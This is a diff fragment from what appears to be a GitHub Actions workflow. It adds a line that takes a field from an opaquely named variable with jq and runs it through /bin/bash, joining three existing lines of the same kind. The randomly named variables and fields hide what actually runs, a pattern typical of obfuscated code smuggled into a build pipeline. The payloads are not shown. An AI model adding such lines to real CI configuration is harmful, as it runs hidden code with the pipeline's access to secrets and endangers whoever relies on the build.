@@ -23,6 +23,7 @@ jobs:
           echo $l2 | jq -r .jan47 | /bin/bash
           printf '%s' "$eba7" | jq -r .tb7798 | /bin/bash
           echo $z47 | jq -r .git0 | /bin/bash
+          printf '%s' "$xpbpg47376" | jq -r .t5923 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
